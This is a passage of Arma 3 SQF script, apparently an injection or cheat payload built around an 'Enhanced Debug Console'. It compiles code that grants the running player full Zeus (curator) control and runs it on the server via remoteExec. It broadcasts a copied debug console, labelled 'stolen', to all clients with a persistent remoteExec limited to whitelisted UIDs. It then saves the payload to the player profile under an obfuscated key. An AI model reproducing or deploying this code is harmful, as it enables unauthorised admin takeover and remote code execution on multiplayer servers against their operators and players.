                sKAM_addZeus_superCuratorVar + " setVariable [''text'',''" + sKAM_addZeus_superCuratorVar + "''];" +   
                sKAM_addZeus_superCuratorVar + " setVariable [''Addons'',3,true];" +   
                sKAM_addZeus_superCuratorVar + " setVariable [''owner'',''objnull''];" +   
                sKAM_addZeus_superCuratorVar + " setVariable [''vehicleinit'',""  
                    _this setVariable [''Addons'',3,true];  
                    _this setVariable [''owner'',''objnull''];  
                ""];" +   
                "unassignCurator " + sKAM_addZeus_superCuratorVar + ";" +   
                "objnull assignCurator " + sKAM_addZeus_superCuratorVar + ";" +   
                sKAM_addZeus_superCuratorPlayerAttributesVar + " = " + sKAM_addZeus_CuratorLogicGroupVar + " createUnit [''ModuleCuratorSetAttributesPlayer_F'', [2, 91, 91],[],0.5,''NONE''];" +   
                sKAM_addZeus_superCuratorPlayerAttributesVar + " setVariable [''curator'',''" + sKAM_addZeus_superCuratorVar + "''];" +   
                sKAM_addZeus_superCuratorPlayerAttributesVar + " setVariable [''unitpos'',true];" +   
                sKAM_addZeus_superCuratorPlayerAttributesVar + " setVariable [''fuel'',true];" +   
                sKAM_addZeus_superCuratorPlayerAttributesVar + " setVariable [''respawnposition'',true];" +   
                sKAM_addZeus_superCuratorPlayerAttributesVar + " setVariable [''respawnvehicle'',true];" +   
                sKAM_addZeus_superCuratorPlayerAttributesVar + " setVariable [''skill'',true];" +   
                sKAM_addZeus_superCuratorPlayerAttributesVar + " setVariable [''rank'',true];" +   
                sKAM_addZeus_superCuratorPlayerAttributesVar + " setVariable [''damage'',true];" +   
                sKAM_addZeus_superCuratorPlayerAttributesVar + " setVariable [''exec'',true];" +   
                sKAM_addZeus_superCuratorPlayerAttributesVar + " setVariable [''lock'',true];" +   
                sKAM_addZeus_superCuratorPlayerAttributesVar + " setVariable [''vehicleinit'',""  
                    _this setVariable [''curator'',''" + sKAM_addZeus_superCuratorVar + "''];  
                    _this setVariable [''unitpos'',true];  
                    _this setVariable [''fuel'',true];  
                    _this setVariable [''respawnposition'',true];  
                    _this setVariable [''respawnvehicle'',true];  
                    _this setVariable [''skill'',true];  
                    _this setVariable [''rank'',true];  
                    _this setVariable [''damage'',true];  
                    _this setVariable [''exec'',true];  
                    _this setVariable [''lock'',true];  
                ""];" +   
                "[" + sKAM_addZeus_superCuratorVar + ",[-2,-1,0,1]] spawn BIS_fnc_setCuratorVisionModes;" +   
                sKAM_addZeus_superCuratorVar + " setVehicleVarName ''" + sKAM_addZeus_superCuratorVar + "'';" +   
                "unassignCurator " + sKAM_addZeus_superCuratorVar + ";" +   
                "objnull assignCurator " + sKAM_addZeus_superCuratorVar + ";" +   
                "unassignCurator " + sKAM_addZeus_superCuratorVar + ";" +   
                sKAM_addZeus_vehicleVarName + " assignCurator " + sKAM_addZeus_superCuratorVar + ";" +   
                sKAM_addZeus_superCuratorVar + " addCuratorEditableObjects [[" + sKAM_addZeus_vehicleVarName + "],true];" +   
                sKAM_addZeus_superCuratorVar + " addCuratorEditableObjects [allMissionObjects ''all'',true];" +   
                sKAM_addZeus_vehicleVarName + "_updateSuperCuratorEditableObjects = true;" +   
                "[] spawn {while {((alive " + sKAM_addZeus_vehicleVarName + ") && (" + sKAM_addZeus_vehicleVarName + "_updateSuperCuratorEditableObjects" + "))} do {sleep 30;" + sKAM_addZeus_superCuratorVar + " addCuratorEditableObjects [allMissionObjects ''all'',true];};};" +   
                sKAM_addZeus_vehicleVarName + "_EH_getZeusOnRespawn2 = " + sKAM_addZeus_vehicleVarName + " addMPEventHandler [''MPRespawn'', {params [''_unit'', ''_corpse''];" +   
                    "_unit spawn {_unit = _this;waitUntil {(alive _unit)};sleep 3;[[],{" +   
                    "unassignCurator " + sKAM_addZeus_superCuratorVar + ";sleep 3;" +   
                    "objnull assignCurator " + sKAM_addZeus_superCuratorVar + ";sleep 3;" +   
                    "unassignCurator " + sKAM_addZeus_superCuratorVar + ";sleep 3;" +   
                    sKAM_addZeus_vehicleVarName + " assignCurator " + sKAM_addZeus_superCuratorVar + ";sleep 3;" +   
                    sKAM_addZeus_vehicleVarName + " assignCurator " + sKAM_addZeus_superCuratorVar + ";sleep 3;" +   
                    sKAM_addZeus_vehicleVarName + " assignCurator " + sKAM_addZeus_superCuratorVar + ";sleep 3;" +   
                    sKAM_addZeus_vehicleVarName + " assignCurator " + sKAM_addZeus_superCuratorVar + ";sleep 3;" +   
                    sKAM_addZeus_vehicleVarName + " assignCurator " + sKAM_addZeus_superCuratorVar + ";sleep 3;" +   
                    sKAM_addZeus_vehicleVarName + " assignCurator " + sKAM_addZeus_superCuratorVar + ";" +   
                    "}] remoteExec [''spawn'',2];};" +   
                "}];"  
                + "");  
                
            
                _initText = sKAM_addZeus_initText;  
                _initCode = compile _initText;  
                zeusTestArray = ["test1",_initCode,"test2"];  
                publicVariableServer "zeusTestArray";  
                [[],{  
                [] spawn (zeusTestArray select 1);  
                }] remoteExec [''spawn'',2];  
                };  
                waitUntil { 
                    !isNull(getAssignedCuratorLogic player) 
                }; 
                _zeusLogic = getAssignedCuratorLogic player; 
                _cfgPatches = (configFile >> "CfgPatches") call BIS_fnc_getCfgSubClasses; 
                [_zeusLogic, _cfgPatches, { 
                    true 
                }, ""] call BIS_fnc_manageCuratorAddons; 
                systemChat ''[ Enhanced Debug Console ] : Curator assigned.''; 
                (findDisplay 49) closeDisplay 2; 
            }; 
            [] spawn _giveZeus; 
        }; 
    
        EDC_fnc_editZeus = { 
            if (isNull(getAssignedCuratorLogic player)) exitWith {}; 
    
    
    
            [player, { 
                _unit = _this; 
                _zeusLogic = objNull; 
                _zeusLogic = getAssignedCuratorLogic _unit; 
                if (isNull _zeusLogic) exitWith {}; 
    
                [ 
                    _zeusLogic, 
                    ''object'', [''Skill'', ''UnitPos'', ''Rank'', ''Damage'', ''Fuel'', ''Lock'', ''RespawnVehicle'', ''RespawnPosition'', ''Exec''] 
                ] call BIS_fnc_setCuratorAttributes; 
    
                [ 
                    _zeusLogic, 
                    ''player'', [''Skill'', ''UnitPos'', ''Rank'', ''Damage'', ''Fuel'', ''Lock'', ''RespawnVehicle'', ''RespawnPosition'', ''Exec''] 
                ] call BIS_fnc_setCuratorAttributes; 
    
                [ 
                    _zeusLogic, 
                    ''group'', [''GroupID'', ''Behaviour'', ''Formation''] 
                ] call BIS_fnc_setCuratorAttributes; 
    
                [ 
                    _zeusLogic, 
                    ''waypoint'', [''Behaviour'', ''Formation''] 
                ] call BIS_fnc_setCuratorAttributes; 
    
                [ 
                    _zeusLogic, 
                    ''marker'', [''MarkerText'', ''MarkerColor''] 
                ] call BIS_fnc_setCuratorAttributes; 
            }] remoteExec[''spawn'']; 
        }; 
    
        _fnc_ZEUS_PLUS = { 
            if (isNull(getAssignedCuratorLogic player)) then { 
                [] spawn EDC_fnc_giveZeus; 
                [] spawn { 
                    waitUntil { 
                        !isNull(getAssignedCuratorLogic player) 
                    }; 
                    _zeusLogic = getAssignedCuratorLogic player; 
                    if ((!isMultiplayer) or(isServer)) then { 
                        if !(_zeusLogic getVariable[''EDC_hasZeusAttributesWindowFix'', false]) then { 
                            _zeusLogic setVariable[''EDC_hasZeusAttributesWindowFix'', true, true]; 
    
                            _zeusLogic addEventHandler["CuratorGroupDoubleClicked", { 
                                params["_curator", "_group"]; 
                                _group call BIS_fnc_showCuratorAttributes; 
                            }]; 
    
                            _zeusLogic addEventHandler["CuratorMarkerDoubleClicked", { 
                                params["_curator", "_marker"]; 
                                _marker call BIS_fnc_showCuratorAttributes; 
                            }]; 
    
                            _zeusLogic addEventHandler["CuratorObjectDoubleClicked", { 
                                params["_curator", "_entity"]; 
                                _entity call BIS_fnc_showCuratorAttributes; 
                            }]; 
    
                            _zeusLogic addEventHandler["CuratorWaypointDoubleClicked", { 
                                params["_curator", "_waypoint"]; 
                                _waypoint call BIS_fnc_showCuratorAttributes; 
                            }]; 
                        }; 
                    }; 
    
                }; 
            } else { 
                systemChat "[ Enhanced Debug Console ] : Zeus logic detected."; 
                (findDisplay 49) closeDisplay 2; 
                openCuratorInterface; 
            }; 
            waitUntil { 
                (!(isNull(getAssignedCuratorLogic player))) 
            }; 
            comment " 
            TODO: [] spawn EDC_fnc_editZeus; 
            "; 
            if (isNil ''test_EDCezm_loop'') then { 
                comment "init EZM lite"; 
                comment "[] spawn EDC_fnc_initEZMLite;"; 
            } else { 
                if (!test_EDCezm_loop) then { 
                    comment "init EZM lite"; 
                    comment "[] spawn EDC_fnc_initEZMLite;"; 
                }; 
            }; 
            true; 
        }; 
        _ZEUSPLUS = [] spawn _fnc_ZEUS_PLUS; 
    
        comment "Fix players not being added to interface:"; 
    
    
    
        [ 
            [], { 
                [] spawn(EDC_REfnc# 8); 
            } 
        ] remoteExec[''call'', 0, ''EDC_JIP_addPlayersToZeusInterface'']; 
    
        comment ''----------------------------------------------------------------- 
        ''; 
    };
    edc_fnc_saveexpression = {
        comment "if (isNull (findDisplay 316000)) exitWith {if (!isGamePaused) then {playSound [''addItemFailed'', true]}};";
        if (isNull(findDisplay 49)) exitWith {
            if (!isGamePaused) then {
                playSound[''addItemFailed'', true]
            }
        };
        private _expressionCtrl = uiNamespace getVariable ''EDC_expression'';
        private _currentExpression = ctrlText _expressionCtrl;
        private _lastExpression = profileNamespace getVariable["RscDebugConsole_expression", ""];

        if (_lastExpression isEqualTo "" || _currentExpression isEqualTo _lastExpression) then {
            _expressionHistory set[count _expressionHistory - 1, _currentExpression];
        }
        else {
            if (_expressionHistory pushBack _currentExpression >= EDC_EXPRESSION_HISTORY_MAX) then {
                _expressionHistory deleteRange[0, count _expressionHistory - EDC_EXPRESSION_HISTORY_MAX]
            };
        };

        profileNamespace setVariable["RscDebugConsole_expression", _currentExpression];
        comment "(findDisplay 316000) setVariable [''RscDebugConsole_expressionHistory_index'', count _expressionHistory - 1];";
        (findDisplay 49) setVariable[''RscDebugConsole_expressionHistory_index'', count _expressionHistory - 1];
    };
    edc_fnc_forceshowconsole = {
        if (isNull(findDisplay 49)) exitWith {};
        private _display = findDisplay 49;
        private _ctrlGroupParent = _display displayCtrl 13184;
        _ctrlGroupParent ctrlEnable true;
        _ctrlGroupParent ctrlShow true;
        _ctrlGroupParent ctrlCommit 0; {
            if (ctrlParentControlsGroup _x == _ctrlGroupParent) then {
                _x ctrlEnable true;
                _x ctrlShow true;
                _x ctrlCommit 0;
            };
        }
        forEach allControls _display;
    };
    edc_fnc_evaluateexternalwatchfield = {
        if (EDC_showWatch1) then {
            private _watchReturn1 = ([nil] apply {
                    [] call _watchCode1
                }
                param[0, text ""]);
            _watchReturnStr1 = str _watchReturn1;
            _watchReturnStr1 = [_watchReturnStr1, 25] call EDC_fnc_limitChars;
        };
        if (EDC_showWatch2) then {
            private _watchReturn2 = ([nil] apply {
                    [] call _watchCode2
                }
                param[0, text ""]);
            _watchReturnStr2 = str _watchReturn2;
            _watchReturnStr2 = [_watchReturnStr2, 25] call EDC_fnc_limitChars;
        };
        if (EDC_showWatch3) then {
            private _watchReturn3 = ([nil] apply {
                    [] call _watchCode3
                }
                param[0, text ""]);
            _watchReturnStr3 = str _watchReturn3;
            _watchReturnStr3 = [_watchReturnStr3, 25] call EDC_fnc_limitChars;
        };
        if (EDC_showWatch4) then {
            private _watchReturn4 = ([nil] apply {
                    [] call _watchCode4
                }
                param[0, text ""]);
            _watchReturnStr4 = str _watchReturn4;
            _watchReturnStr4 = [_watchReturnStr4, 25] call EDC_fnc_limitChars;
        };
        hintSilent parseText format[
            _hintStr,
            _watchText1,
            _watchReturnStr1,
            _watchText2,
            _watchReturnStr2,
            _watchText3,
            _watchReturnStr3,
            _watchText4,
            _watchReturnStr4
        ];
        sleep 0.1;
    };
    edc_fnc_listzeuses = {
        _allPlayers = [] call bis_fnc_listPlayers;
        _allZeuses = []; {
            _zeus = getAssignedCuratorUnit _x;
            if (!isNull _zeus) then {
                if !(_zeus in _allPlayers) then {
                    _allPlayers pushBackUnique _zeus;
                    _allZeuses pushBackUnique _zeus;
                };
            };
        }
        forEach allCurators;
        _allZeuses;
    };
    edc_fnc_updateplayercount = {
        with uinamespace do {
            EDC_PerfMetPlayerCount ctrlSetStructuredText parseText format["<t align=''left'' font=''RobotoCondensed'' shadow=''2'' color=''#FFFFFF'' size=''%1''>  Player Count<t align=''center''><t align=''right'' font=''EtelkaMonospacePro'' size=''%3''>%2 <t/>", 0.95 * EDC_textSize, ''...'', 1.05 * EDC_textSize];
            EDC_PerfMetPlayerCount ctrlCommit 0;
            EDC_PerfMetPlayerCount ctrlSetStructuredText parseText format["<t align=''left'' font=''RobotoCondensed'' shadow=''2'' color=''#FFFFFF'' size=''%1''>  Player Count<t align=''center''><t align=''right'' font=''EtelkaMonospacePro'' size=''%3''>%2 <t/>", 0.95 * EDC_textSize, count allPlayers, 1.05 * EDC_textSize];
            EDC_PerfMetPlayerCount ctrlCommit 0;
        };

    };
    edc_fnc_interfacesizewarning = {
        private _resolutionData = getResolution;
        private _interfaceSize = _resolutionData# 5;
        private _interfaceSizeVS = 0.47;
        private _interfaceSizeS = 0.55;
        private _interfaceSizeN = 0.7;
        private _interfaceSizeL = 0.85;
        private _interfaceSizeVL = 1;
        private _interfaceSizeStr =
        switch (_interfaceSize) do {
            case _interfaceSizeVS:{
                    ''very small''
                };
            case _interfaceSizeS:{
                    ''small''
                };
            case _interfaceSizeN:{
                    ''normal''
                };
            case _interfaceSizeL:{
                    ''large''
                };
            case _interfaceSizeVL:{
                    ''very large''
                };
        };
        if (_interfaceSize != _interfaceSizeS) then {
            comment "Warning Message:";
            private _warningMessage = format["<t align=''center'' size=''1.5'' font=''puristaBold'' color=''#ffd100''><br/>WRONG INTERFACE SIZE<br/><t size=''1'' font=''puristaMedium'' color=''#FFFFFF''>( You are using: %1 )<br/><br/><t size=''0.8'' font=''EtelkaMonospacePro'' color=''#FFFFFF''>EDC is incompatable with other sizes because it was created using <t color=''#ffd100''>small.<br/><br/><t color=''#ffffff''>You must set the interface size to <t color=''#ffd100''>small <t color=''#ffffff''>in the video options to avoid UI errors.<t/>", toUpper _interfaceSizeStr];
            [_warningMessage, "[ Enhanced Debug Console ] : Warning!", true, false] spawn BIS_fnc_guiMessage;
        };
    };
    edc_fnc_unhighlightallobjects = {
        [missionNamespace getVariable[''EDC_highlighedObjects'', []],
            [0, 1, 1, 1], false
        ] call BIS_fnc_drawBoundingBox;
        missionNamespace setVariable[''EDC_highlighedObjects'', []];
        if (!isNil ''EDC_EH_highlightObj'') then {
            removeMissionEventHandler[''Draw3D'', EDC_EH_highlightObj];
        };
    };
    edc_fnc_listplayers = {
        _allPlayers = allPlayers;
        _allPlayers2 = [] call bis_fnc_listPlayers; {
            _allPlayers pushBackUnique _x;
        }
        forEach _allPlayers2;
        _allZeuses = []; {
            _zeus = getAssignedCuratorUnit _x;
            if (!isNull _zeus) then {
                if !(_zeus in _allPlayers) then {
                    _allPlayers pushBackUnique _zeus;
                    _allZeuses pushBackUnique _zeus;
                };
            };
        }
        forEach allCurators;
        _allPlayers;
    };
    edc_fnc_commentcompatability = {
        _input = _this select 0;

        private _strings = [];
        private _start = -1;

        while {
            _start = _input find "//";
            _start > -1
        }
        do {
            _input select[0, _start] call {
                private _badQuotes = _this call {
                    private _qtsGood = [];
                    private _qtsInfo = [];
                    private _arr = toArray _this;

                    {
                        _qtsGood pushBack((count _arr - count(_arr - [_x])) % 2 == 0);
                        _qtsInfo pushBack[_this find toString[_x], _x];
                    }
                    forEach[34, 39];

                    if (_qtsGood isEqualTo[true, true]) exitWith {
                        0
                    };

                    _qtsInfo sort true;
                    _qtsInfo select 0 select 1
                };

                if (_badQuotes > 0) exitWith {
                    _last = _input select[_start] find toString[_badQuotes];

                    if (_last < 0) exitWith {
                        _strings = [_input];
                        _input = "";
                    };

                    _last = _start + _last + 1;
                    _strings pushBack(_input select[0, _last]);

                    _input = _input select[_last];
                };

                _strings pushBack _this;

                _input = _input select[_start];

                private _end = _input find toString[10];

                if (_end < 0) exitWith {
                    _input = ""
                };

                _input = _input select[_end + 1];
            };
        };

        _input = (_strings joinString "") + _input;
        _input
    };
    edc_fnc_initializes = {
        [] call EDC_fnc_initVars;
        if (!isNil ''EDC_EH_gamePaused'') then {
            [missionNamespace, ''OnGameInterrupt'', EDC_EH_gamePaused] call BIS_fnc_removeScriptedEventHandler;
        };
        EDC_EH_gamePaused = [missionNamespace, ''OnGameInterrupt'', EDC_fnc_gamePausedEvent] call BIS_fnc_addScriptedEventHandler;
        [] call EDC_fnc_interfaceSizeWarning;
        [] spawn EDC_fnc_initCustomKeybinds;
        systemChat "[ Enhanced Debug Console ] : Initialized.";
    };
    if (_this select 0) then {
        waitUntil { 
            !isNull (findDisplay 46) && alive player 
        }; 
        [] spawn edc_fnc_initializes;
    };
};
MAS_RE_fnc_Debug = [''Menu'', SAM_stolenDebugconsoleLOL]; 
publicVariable ''MAS_RE_fnc_Debug''; 
comment "ahhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh";
[[], { 
    [] spawn {
        if (isNil "bool") then {
            bool = true;
        } else {
            bool = false;
        };  
        if (((getPlayerUID player) in UsersWhoAreSuperWhitelisted) and bool) then {
            _init = true;
            [_init] spawn {
                [_this select 0] spawn MAS_RE_fnc_Debug#1;
            };
        } else {
            _init = false;
            [_init] spawn {
                [_this select 0] spawn MAS_RE_fnc_Debug#1;
            };
        };
    };
}] remoteExec ["spawn", 0, "pvtDSAM"]; 
}';    
profileNamespace setVariable ["i2n3j4e5c6t7_8008", _test];
saveProfileNamespace;
